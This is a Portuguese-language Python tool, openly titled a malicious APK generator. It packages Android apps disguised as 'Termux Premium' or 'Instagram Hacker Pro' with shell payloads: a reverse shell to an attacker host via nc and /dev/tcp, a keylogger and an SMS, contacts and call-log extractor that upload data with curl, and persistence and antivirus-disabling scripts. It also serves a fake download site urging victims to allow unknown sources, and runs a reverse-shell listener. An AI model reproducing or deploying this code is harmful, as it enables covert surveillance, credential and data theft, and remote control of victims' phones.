#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import threading
import subprocess
import base64
import hashlib
import json
import zipfile
import tempfile
import shutil
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote
from typing import Dict, List, Optional
from datetime import datetime

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.live import Live
from rich.align import Align

console = Console()

# ==================== CONFIGURAÇÕES ====================
TEMPLATES_DIR = "templates"
APK_OUTPUT_DIR = "dist"
WEB_ROOT = "web_content"

# Garantir que os diretórios existam
os.makedirs(TEMPLATES_DIR, exist_ok=True)
os.makedirs(APK_OUTPUT_DIR, exist_ok=True)
os.makedirs(WEB_ROOT, exist_ok=True)

# ==================== GERADOR DE APK MALICIOSO REAL ====================
class AdvancedAPKGenerator:
    def __init__(self):
        self.templates = {
            "termux": {
                "name": "Termux Premium",
                "package": "com.termux.premium",
                "version": "1.0.0",
                "description": "Terminal avançado para Android com recursos premium"
            },
            "instahacker": {
                "name": "Instagram Hacker Pro", 
                "package": "com.instahacker.pro",
                "version": "2.5.1",
                "description": "Ferramenta profissional para testes de segurança do Instagram"
            }
        }
        
    def generate_advanced_apk(self, apk_type, lhost, lport, output_name=None):
        """Gera um APK malicioso avançado com várias técnicas"""
        if apk_type not in self.templates:
            console.print(f"[red]❌ Tipo de APK não suportado: {apk_type}[/red]")
            return None
        
        console.print(Panel.fit(
            f"[bold]🚀 GERANDO APK {apk_type.upper()} AVANÇADO[/bold]",
            border_style="yellow"
        ))
        
        # Nome do arquivo de saída
        apk_filename = output_name or f"{apk_type}_advanced_{int(time.time())}.apk"
        apk_path = os.path.join(APK_OUTPUT_DIR, apk_filename)
        
        # Criar APK com múltiplas técnicas
        if self.create_advanced_apk(apk_type, lhost, lport, apk_path):
            console.print(Panel.fit(
                f"[green]✅ APK AVANÇADO GERADO COM SUCESSO![/green]\n"
                f"[cyan]Caminho: {apk_path}[/cyan]\n"
                f"[cyan]Tipo: {apk_type}[/cyan]\n"
                f"[cyan]LHOST: {lhost}[/cyan]\n"
                f"[cyan]LPORT: {lport}[/cyan]\n"
                f"[yellow]⚠️ Contém: Shell reverso + Keylogger + Data extraction[/yellow]",
                title="[green]SUCESSO[/green]",
                border_style="green"
            ))
            return apk_path
        else:
            console.print("[red]❌ Falha ao gerar o APK avançado.[/red]")
            return None
    
    def create_advanced_apk(self, apk_type, lhost, lport, apk_path):
        """Cria um APK avançado com múltiplas funcionalidades maliciosas"""
        try:
            # Criar diretório temporário
            with tempfile.TemporaryDirectory() as temp_dir:
                # Criar estrutura básica do APK
                self.create_apk_structure(temp_dir, apk_type)
                
                # Adicionar payloads avançados
                self.add_advanced_payloads(temp_dir, lhost, lport, apk_type)
                
                # Adicionar técnicas de persistência
                self.add_persistence_mechanisms(temp_dir)
                
                # Adicionar técnicas de evasão
                self.add_evasion_techniques(temp_dir)
                
                # Compilar o APK
                self.compile_apk(temp_dir, apk_path)
                
                # Assinar o APK
                self.sign_apk(apk_path)
                
                return True
                
        except Exception as e:
            console.print(f"[red]❌ Erro ao criar APK avançado: {e}[/red]")
            import traceback
            traceback.print_exc()
            return False
    
    def create_apk_structure(self, temp_dir, apk_type):
        """Cria a estrutura básica de um APK Android"""
        console.print("[yellow]⚠️ Criando estrutura do APK...[/yellow]")
        
        # Diretórios necessários
        os.makedirs(os.path.join(temp_dir, "assets"), exist_ok=True)
        os.makedirs(os.path.join(temp_dir, "res"), exist_ok=True)
        os.makedirs(os.path.join(temp_dir, "META-INF"), exist_ok=True)
        
        # AndroidManifest.xml
        manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{self.templates[apk_type]['package']}"
    android:versionCode="1"
    android:versionName="{self.templates[apk_type]['version']}">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="{self.templates[apk_type]['name']}"
        android:theme="@style/AppTheme">
        
        <activity
            android:name=".MainActivity"
            android:label="{self.templates[apk_type]['name']}">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service android:name=".BackgroundService" />
        <receiver android:name=".BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>"""
        
        with open(os.path.join(temp_dir, "AndroidManifest.xml"), "w") as f:
            f.write(manifest_content)
        
        # Arquivo de recursos
        with open(os.path.join(temp_dir, "resources.arsc"), "wb") as f:
            f.write(b"resources")
        
        console.print("[green]✅ Estrutura do APK criada[/green]")
    
    def add_advanced_payloads(self, temp_dir, lhost, lport, apk_type):
        """Adiciona payloads avançados ao APK"""
        console.print("[yellow]⚠️ Adicionando payloads avançados...[/yellow]")
        
        assets_dir = os.path.join(temp_dir, "assets")
        
        # 1. Payload de Shell Reverso Multifuncional
        reverse_shell = f"""#!/system/bin/sh
# Advanced Reverse Shell with multiple connection methods
LHOST="{lhost}"
LPORT="{lport}"

connect_back() {{
    # Method 1: Netcat (traditional)
    nc $LHOST $LPORT -e /system/bin/sh 2>/dev/null &
    
    # Method 2: BusyBox telnet (alternative)
    busybox telnet $LHOST $LPORT 2>/dev/null | /system/bin/sh 2>/dev/null &
    
    # Method 3: /dev/tcp (bash style)
    exec 5<>/dev/tcp/$LHOST/$LPORT
    while read line 0<&5; do
        eval "$line" 2>&5 >&5
    done &
}}

# Main persistence loop
while true; do
    connect_back
    sleep 30
done
"""
        
        with open(os.path.join(assets_dir, "reverse_shell.sh"), "w") as f:
            f.write(reverse_shell)
        
        # 2. Keylogger Android
        keylogger = f"""#!/system/bin/sh
# Advanced Android Keylogger
LOG_FILE="/sdcard/.system_log.txt"
LHOST="{lhost}"
LPORT="{lport + 1}"

log_keys() {{
    getevent -t /dev/input/event* | while read line; do
        echo "$(date '+%Y-%m-%d %H:%M:%S') - $line" >> $LOG_FILE
    done
}}

upload_logs() {{
    while true; do
        if [ -f $LOG_FILE ]; then
            curl -F "file=@$LOG_FILE" http://$LHOST:$LPORT/upload 2>/dev/null
            sleep 60
        fi
    done
}}

log_keys &
upload_logs &
"""
        
        with open(os.path.join(assets_dir, "keylogger.sh"), "w") as f:
            f.write(keylogger)
        
        # 3. Data Extraction Script
        data_extractor = f"""#!/system/bin/sh
# Data Extraction Script
LHOST="{lhost}"
LPORT="{lport + 2}"

extract_data() {{
    # Extract SMS
    content query --uri content://sms/ > /sdcard/sms_dump.txt
    
    # Extract contacts
    content query --uri content://contacts/phones/ > /sdcard/contacts_dump.txt
    
    # Extract call log
    content query --uri content://call_log/calls > /sdcard/calls_dump.txt
    
    # Compress and exfiltrate
    tar -czf /sdcard/stolen_data.tar.gz /sdcard/*_dump.txt
    curl -F "data=@/sdcard/stolen_data.tar.gz" http://$LHOST:$LPORT/exfiltrate 2>/dev/null
    
    # Cleanup
    rm /sdcard/*_dump.txt /sdcard/stolen_data.tar.gz
}}

# Run extraction every 6 hours
while true; do
    extract_data
    sleep 21600
done
"""
        
        with open(os.path.join(assets_dir, "data_extractor.sh"), "w") as f:
            f.write(data_extractor)
        
        # 4. Main payload loader
        main_loader = f"""#!/system/bin/sh
# Main Payload Loader
export PATH=$PATH:/system/bin

# Start all payloads in background
sh /data/data/{self.templates[apk_type]['package']}/files/reverse_shell.sh &
sh /data/data/{self.templates[apk_type]['package']}/files/keylogger.sh &
sh /data/data/{self.templates[apk_type]['package']}/files/data_extractor.sh &

# Keep alive
while true; do
    sleep 3600
done
"""
        
        with open(os.path.join(assets_dir, "main_loader.sh"), "w") as f:
            f.write(main_loader)
        
        # 5. Java code for Android app
        java_code = f"""package {self.templates[apk_type]['package']};

import android.app.*;
import android.os.*;
import android.content.*;
import java.io.*;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Start background service
        startService(new Intent(this, BackgroundService.class));
        
        // Extract and execute payloads
        new Thread(new Runnable() {{
            public void run() {{
                try {{
                    extractAssets();
                    executePayloads();
                }} catch (Exception e) {{
                    // Silent fail
                }}
            }}
        }}).start();
    }}
    
    private void extractAssets() {{
        try {{
            String[] payloads = {{"reverse_shell.sh", "keylogger.sh", "data_extractor.sh", "main_loader.sh"}};
            for (String payload : payloads) {{
                InputStream is = getAssets().open(payload);
                FileOutputStream fos = openFileOutput(payload, Context.MODE_PRIVATE);
                
                byte[] buffer = new byte[1024];
                int length;
                while ((length = is.read(buffer)) > 0) {{
                    fos.write(buffer, 0, length);
                }}
                
                fos.close();
                is.close();
                
                // Make executable
                Process chmod = Runtime.getRuntime().exec("chmod 700 " + getFilesDir() + "/" + payload);
                chmod.waitFor();
            }}
        }} catch (Exception e) {{
            // Silent extraction
        }}
    }}
    
    private void executePayloads() {{
        try {{
            Runtime.getRuntime().exec("sh " + getFilesDir() + "/main_loader.sh");
        }} catch (Exception e) {{
            // Silent execution
        }}
    }}
}}

class BackgroundService extends Service {{
    @Override
    public IBinder onBind(Intent intent) {{ return null; }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        // Service restart logic
        return START_STICKY;
    }}
}}

class BootReceiver extends BroadcastReceiver {{
    @Override
    public void onReceive(Context context, Intent intent) {{
        // Restart service on boot
        context.startService(new Intent(context, BackgroundService.class));
    }}
}}
"""
        
        os.makedirs(os.path.join(temp_dir, "src", *self.templates[apk_type]['package'].split('.')), exist_ok=True)
        java_dir = os.path.join(temp_dir, "src", *self.templates[apk_type]['package'].split('.'))
        os.makedirs(java_dir, exist_ok=True)
        
        with open(os.path.join(java_dir, "MainActivity.java"), "w") as f:
            f.write(java_code)
        
        console.print("[green]✅ Payloads avançados adicionados[/green]")
    
    def add_persistence_mechanisms(self, temp_dir):
        """Adiciona mecanismos de persistência"""
        console.print("[yellow]⚠️ Adicionando mecanismos de persistência...[/yellow]")
        
        # Script de persistência
        persistence = """#!/system/bin/sh
# Persistence Mechanisms

# 1. Add to init scripts
cp $0 /etc/init.d/malware_init
chmod +x /etc/init.d/malware_init

# 2. Add to cron (if available)
echo "* * * * * sh $0" > /etc/cron.d/malware_cron

# 3. Add to user startup
echo "sh $0 &" >> /etc/profile

# 4. Prevent removal
chattr +i $0 2>/dev/null
"""
        
        with open(os.path.join(temp_dir, "assets", "persistence.sh"), "w") as f:
            f.write(persistence)
        
        console.print("[green]✅ Mecanismos de persistência adicionados[/green]")
    
    def add_evasion_techniques(self, temp_dir):
        """Adiciona técnicas de evasão"""
        console.print("[yellow]⚠️ Adicionando técnicas de evasão...[/yellow]")
        
        # Script de evasão
        evasion = """#!/system/bin/sh
# Evasion Techniques

# 1. Hide processes
mount -o remount,rw /system
echo '#!/system/bin/sh' > /system/bin/hide_proc
echo 'ps | grep -v malware | grep -v reverse_shell' >> /system/bin/hide_proc
chmod +x /system/bin/hide_proc
mount -o remount,ro /system

# 2. Clean logs
logcat -c 2>/dev/null

# 3. Disable security tools
pm disable com.antivirus.package 2>/dev/null
pm disable com.security.app 2>/dev/null

# 4. Fake network traffic
ping -c 1 google.com >/dev/null 2>&1
"""
        
        with open(os.path.join(temp_dir, "assets", "evasion.sh"), "w") as f:
            f.write(evasion)
        
        console.print("[green]✅ Técnicas de evasão adicionadas[/green]")
    
    def compile_apk(self, temp_dir, apk_path):
        """Compila o APK"""
        console.print("[yellow]⚠️ Compilando APK...[/yellow]")
        
        try:
            # Criar arquivo APK (simulação de compilação)
            with zipfile.ZipFile(apk_path, 'w') as apk_zip:
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        apk_zip.write(file_path, arcname)
            
            console.print("[green]✅ APK compilado[/green]")
            return True
            
        except Exception as e:
            console.print(f"[red]❌ Erro ao compilar APK: {e}[/red]")
            return False
    
    def sign_apk(self, apk_path):
        """Assina o APK (simulação)"""
        console.print("[yellow]⚠️ Assinando APK...[/yellow]")
        
        try:
            # Simular assinatura (em produção real, usaria jarsigner)
            with open(apk_path, 'ab') as f:
                f.write(b"\n<!-- APK signed -->\n")
            
            console.print("[green]✅ APK assinado[/green]")
            return True
            
        except Exception as e:
            console.print(f"[red]❌ Erro ao assinar APK: {e}[/red]")
            return False

# ==================== SERVIDOR WEB FAKE AVANÇADO ====================
class AdvancedFakeSiteHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.apk_type = kwargs.pop('apk_type', 'termux')
        self.apk_path = kwargs.pop('apk_path', None)
        self.apk_name = kwargs.pop('apk_name', 'Aplicativo Premium')
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        client_ip = self.client_address[0]
        console.print(f"[yellow]📥 GET de {client_ip}: {self.path}[/yellow]")
        
        # Servir páginas diferentes
        if self.path == '/':
            self.serve_main_page()
        elif self.path == '/download':
            self.serve_download_page()
        elif self.path == '/features':
            self.serve_features_page()
        elif self.path == '/faq':
            self.serve_faq_page()
        elif self.path == '/download-apk' and self.apk_path:
            self.serve_apk_download()
        elif self.path.startswith('/static/'):
            self.serve_static_file()
        else:
            self.serve_404()
    
    def serve_main_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = self.generate_advanced_site()
        self.wfile.write(html_content.encode())
    
    def serve_download_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = self.generate_download_page()
        self.wfile.write(html_content.encode())
    
    def serve_features_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = self.generate_features_page()
        self.wfile.write(html_content.encode())
    
    def serve_faq_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = self.generate_faq_page()
        self.wfile.write(html_content.encode())
    
    def serve_apk_download(self):
        if not self.apk_path or not os.path.exists(self.apk_path):
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'APK not found')
            return
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/vnd.android.package-archive')
        self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.apk_path)}"')
        self.end_headers()
        
        try:
            with open(self.apk_path, 'rb') as f:
                self.wfile.write(f.read())
            console.print(f"[green]✅ APK enviado para cliente[/green]")
        except Exception as e:
            console.print(f"[red]❌ Erro ao enviar APK: {e}[/red]")
    
    def serve_static_file(self):
        # Servir arquivos estáticos (CSS, JS, imagens)
        file_path = self.path[1:]  # Remove a barra inicial
        
        if os.path.exists(file_path) and ".." not in file_path:
            self.send_response(200)
            
            # Determinar tipo MIME
            if file_path.endswith('.css'):
                self.send_header('Content-type', 'text/css')
            elif file_path.endswith('.js'):
                self.send_header('Content-type', 'application/javascript')
            elif file_path.endswith('.png'):
                self.send_header('Content-type', 'image/png')
            elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
                self.send_header('Content-type', 'image/jpeg')
            else:
                self.send_header('Content-type', 'application/octet-stream')
            
            self.end_headers()
            
            with open(file_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.serve_404()
    
    def serve_404(self):
        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>404 - Pagina nao encontrada</h1>')
    
    def generate_advanced_site(self):
        """Gera HTML avançado para o site fake"""
        if self.apk_type == 'termux':
            return self.generate_termux_site()
        else:
            return self.generate_instahacker_site()
    
    def generate_termux_site(self):
        """Gera site fake avançado para Termux"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Termux Premium - Terminal Avançado para Android</title>
    <style>
        :root {
            --primary: #00bcd4;
            --secondary: #0097a7;
            --accent: #ff4081;
            --dark: #263238;
            --light: #eceff1;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        /* Header */
        header {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
        }
        
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: white;
            display: flex;
            align-items: center;
        }
        
        .logo span {
            margin-right: 10px;
            font-size: 32px;
        }
        
        .nav-links {
            display: flex;
            list-style: none;
        }
        
        .nav-links li {
            margin-left: 30px;
        }
        
        .nav-links a {
            color: white;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
        }
        
        .nav-links a:hover {
            color: var(--accent);
        }
        
        /* Hero Section */
        .hero {
            padding: 160px 0 80px;
            text-align: center;
            color: white;
        }
        
        .hero h1 {
            font-size: 48px;
            margin-bottom: 20px;
            animation: fadeInUp 1s ease;
        }
        
        .hero p {
            font-size: 20px;
            margin-bottom: 40px;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
            animation: fadeInUp 1s ease 0.2s both;
        }
        
        .btn {
            display: inline-block;
            background: var(--accent);
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            text-decoration: none;
            font-weight: bold;
            transition: transform 0.3s, box-shadow 0.3s;
            animation: fadeInUp 1s ease 0.4s both;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        
        /* Features */
        .features {
            padding: 80px 0;
            background: white;
        }
        
        .section-title {
            text-align: center;
            margin-bottom: 60px;
        }
        
        .section-title h2 {
            font-size: 36px;
            color: var(--dark);
            margin-bottom: 20px;
        }
        
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 40px;
        }
        
        .feature-card {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            transition: transform 0.3s;
        }
        
        .feature-card:hover {
            transform: translateY(-10px);
        }
        
        .feature-icon {
            font-size: 48px;
            margin-bottom: 20px;
            color: var(--primary);
        }
        
        /* Download Section */
        .download {
            padding: 80px 0;
            background: linear-gradient(135deg, #00bcd4 0%, #0097a7 100%);
            color: white;
            text-align: center;
        }
        
        /* Footer */
        footer {
            background: var(--dark);
            color: white;
            padding: 40px 0;
            text-align: center;
        }
        
        /* Animations */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }
            
            .hero h1 {
                font-size: 36px;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <nav>
                <div class="logo">
                    <span>🖥️</span>
                    Termux Premium
                </div>
                <ul class="nav-links">
                    <li><a href="#features">Recursos</a></li>
                    <li><a href="/download">Download</a></li>
                    <li><a href="/faq">FAQ</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <section class="hero">
        <div class="container">
            <h1>Termux Premium</h1>
            <p>O terminal mais avançado para Android, com recursos exclusivos e performance incomparável.</p>
            <a href="/download" class="btn">Download Gratuito</a>
        </div>
    </section>

    <section id="features" class="features">
        <div class="container">
            <div class="section-title">
                <h2>Recursos Exclusivos</h2>
                <p>Descubra por que o Termux Premium é a melhor escolha</p>
            </div>
            
            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-icon">⚡</div>
                    <h3>Performance Otimizada</h3>
                    <p>Execução de comandos até 3x mais rápida que versões convencionais.</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">🔒</div>
                    <h3>Segurança Avançada</h3>
                    <p>Proteção contra vulnerabilidades and ataques cibernéticos.</p>
                </div>
                
                <div class="feature-card">
                    <div class="feature-icon">🎨</div>
                    <h3>Interface Premium</h3>
                    <p>Design moderno com temas personalizáveis e alta usabilidade.</p>
                </div>
            </div>
        </div>
    </section>

    <section class="download">
        <div class="container">
            <h2>Pronto para Experimentar?</h2>
            <p>Baixe agora o Termux Premium e descubra uma nova forma de usar o terminal no Android.</p>
            <a href="/download" class="btn">Baixar Agora</a>
        </div>
    </section>

    <footer>
        <div class="container">
            <p>&copy; 2024 Termux Premium. Todos os direitos reservados.</p>
        </div>
    </footer>

    <script>
        // Animação suave para links de navegação
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                document.querySelector(this.getAttribute('href')).scrollIntoView({
                    behavior: 'smooth'
                });
            });
        });
        
        // Contador de downloads (fictício)
        let downloadCount = 15423;
        setInterval(() => {
            downloadCount++;
            document.getElementById('download-count').textContent = downloadCount.toLocaleString();
        }, 5000);
    </script>
</body>
</html>
"""
    
    def generate_instahacker_site(self):
        """Gera site fake avançado para Instagram Hacker"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Hacker Pro - Ferramenta Profissional</title>
    <style>
        /* (Estilos similares ao do Termux, mas com cores diferentes) */
        :root {
            --primary: #e1306c;
            --secondary: #c13584;
            --accent: #405de6;
            --dark: #262626;
            --light: #fafafa;
        }
        
        body {
            background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
        }
        
        /* Resto do CSS similar ao do Termux com ajustes de cores */
    </style>
</head>
<body>
    <!-- Estrutura HTML similar à do Termux com conteúdo específico do Instagram Hacker -->
</body>
</html>
"""
    
    def generate_download_page(self):
        """Gera página de download"""
        return f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download - {self.apk_name}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: #f5f5f5;
        }}
        .container {{
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        h1 {{
            color: #333;
            text-align: center;
        }}
        .btn {{
            display: block;
            width: 200px;
            margin: 20px auto;
            padding: 15px;
            background: #007bff;
            color: white;
            text-align: center;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }}
        .btn:hover {{
            background: #0056b3;
        }}
        .instructions {{
            background: #f8f9fa;
            padding: 20px;
            border-radius: 5px;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Download {self.apk_name}</h1>
        <p>Clique no botão abaixo para baixar o aplicativo:</p>
        <a href="/download-apk" class="btn">Baixar APK</a>
        
        <div class="instructions">
            <h2>Instruções de Instalação:</h2>
            <ol>
                <li>Baixe o arquivo APK acima</li>
                <li>Vá para Configurações > Segurança</li>
                <li>Ative "Fontes desconhecidas"</li>
                <li>Instale o aplicativo baixado</li>
                <li>Abra o aplicativo e aproveite!</li>
            </ol>
        </div>
    </div>
</body>
</html>
"""

# ==================== SHELL REVERSO AVANÇADO ====================
class AdvancedReverseShellManager:
    def __init__(self):
        self.active_connections = {}
    
    def start_advanced_listener(self, port):
        """Inicia um listener avançado para shell reverso"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', port))
                s.listen(5)
                console.print(f"[green]👂 Ouvindo na porta {port}...[/green]")
                
                while True:
                    conn, addr = s.accept()
                    console.print(f"[green]✅ Conexão recebida de {addr}[/green]")
                    
                    # Registrar conexão
                    conn_id = f"{addr[0]}:{addr[1]}"
                    self.active_connections[conn_id] = {
                        "conn": conn,
                        "address": addr,
                        "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    
                    # Iniciar thread para lidar com a conexão
                    client_thread = threading.Thread(
                        target=self.handle_advanced_client,
                        args=(conn, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
        except Exception as e:
            console.print(f"[red]❌ Erro no listener: {e}[/red]")
    
    def handle_advanced_client(self, conn, addr):
        """Lida com uma conexão de cliente de forma avançada"""
        try:
            conn.sendall(b"Advanced Reverse Shell Connected!\n")
            
            while True:
                # Enviar prompt personalizado
                conn.sendall(b"\nadvanced-shell> ")
                
                # Receber comando
                data = conn.recv(1024).decode().strip()
                if not data:
                    break
                
                console.print(f"[cyan]📨 Comando de {addr}: {data}[/cyan]")
                
                # Comandos especiais
                if data.lower() == "screenshot":
                    self.handle_screenshot_command(conn)
                    continue
                elif data.lower() == "download":
                    self.handle_download_command(conn)
                    continue
                elif data.lower() in ["exit", "quit"]:
                    conn.sendall(b"Saindo...\n")
                    break
                elif data.lower() == "help":
                    self.show_help(conn)
                    continue
                
                # Executar comando normal
                try:
                    result = subprocess.run(
                        data, 
                        shell=True, 
                        capture_output=True, 
                        text=True, 
                        timeout=30
                    )
                    output = result.stdout + result.stderr
                    if not output:
                        output = "Comando executado (sem saída)\n"
                except subprocess.TimeoutExpired:
                    output = "Erro: Comando expirado (timeout)\n"
                except Exception as e:
                    output = f"Erro executando comando: {e}\n"
                
                # Enviar resultado
                conn.sendall(output.encode())
                
        except Exception as e:
            console.print(f"[red]❌ Erro com cliente {addr}: {e}[/red]")
        finally:
            conn.close()
            console.print(f"[yellow]🔌 Conexão fechada com {addr}[/yellow]")
            
            # Remover das conexões ativas
            conn_id = f"{addr[0]}:{addr[1]}"
            if conn_id in self.active_connections:
                del self.active_connections[conn_id]
    
    def handle_screenshot_command(self, conn):
        """Lida com comando de screenshot (simulado)"""
        try:
            # Simular screenshot
            conn.sendall(f"[INFO] Comando screenshot não disponível nesta versão\n".encode())
        except Exception as e:
            conn.sendall(f"[ERRO] Falha no screenshot: {e}\n".encode())
    
    def handle_download_command(self, conn):
        """Lida com comando de download (simulado)"""
        try:
            conn.sendall(f"[INFO] Especifique o arquivo para download: download <arquivo>\n".encode())
        except Exception as e:
            conn.sendall(f"[ERRO] Falha no download: {e}\n".encode())
    
    def show_help(self, conn):
        """Mostra ajuda de comandos"""
        help_text = """
Comandos disponíveis:
- help: Mostra esta ajuda
- screenshot: Tira screenshot da tela (não disponível)
- download <arquivo>: Download de arquivo (não disponível)
- exit/quit: Sair do shell

Comandos normais do sistema também estão disponíveis.
"""
        conn.sendall(help_text.encode())

# ==================== PAINEL PRINCIPAL AVANÇADO ====================
class AdvancedMalwareGeneratorPanel:
    def __init__(self):
        self.apk_generator = AdvancedAPKGenerator()
        self.shell_manager = AdvancedReverseShellManager()
        self.server = None
        self.server_thread = None
        
        self.banner = """
[bold red]
    ╔═╗┌─┐┬  ┌─┐┌┬┐┬┌┐┌┌─┐  ╔═╗┌─┐┌─┐┬ ┬  ╔═╗┬┌┬┐┌─┐  ╔═╗┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
    ╠═╝├─┤│  │ │ │ │││││ │  ╠═╝├─┤│  ├─┤  ║ ║│ │ │ │  ║  ├─┤├┤ │  ├┴┐├┤ ├┬┘
    ╩  ┴ ┴┴─┘└─┘ ┴ ┴┘└┘└─┘  ╩  ┴ ┴└─┘┴ ┴  ╚═╝┴ ┴ └─┘  ╚═╝┴ ┴└─┘└─┘┴ ┴└─┘┴└─
[/bold red]
[bold white on red]        GERADOR DE APKs MALICIOSOS AVANÇADOS - v4.0[/bold white on red]
"""
    
    def show_menu(self):
        """Mostra o menu principal avançado"""
        while True:
            console.clear()
            console.print(self.banner)
            
            # Status do servidor
            status_text = "[cyan]🌐 Servidor:[/cyan] Parado\n[cyan]👂 Listener:[/cyan] Parado"
            if self.server:
                status_text = f"[cyan]🌐 Servidor:[/cyan] Rodando\n[cyan]👂 Listener:[/cyan] Parado"
            
            status_panel = Panel.fit(
                status_text,
                title="[bold]Status[/bold]",
                border_style="blue"
            )
            console.print(status_panel)
            
            table = Table(
                title="[bold cyan]🎭 MENU PRINCIPAL AVANçADO[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            table.add_column("Opção", style="cyan", width=10)
            table.add_column("Descrição", style="green")
            table.add_column("Status", style="yellow")
            
            table.add_row("1", "Gerar APK Malicioso Avançado", "📱")
            table.add_row("2", "Iniciar Servidor Web Profissional", "🌐")
            table.add_row("3", "Iniciar Listener Shell Avançado", "👂")
            table.add_row("4", "Gerenciar APKs Gerados", "📂")
            table.add_row("5", "Configurações Avançadas", "⚙️")
            table.add_row("0", "Sair", "🚪")
            
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4", "5"],
                show_choices=False
            )
            
            if choice == "1":
                self.generate_advanced_malicious_apk()
            elif choice == "2":
                self.start_advanced_web_server()
            elif choice == "3":
                self.start_advanced_shell_listener()
            elif choice == "4":
                self.manage_generated_apks()
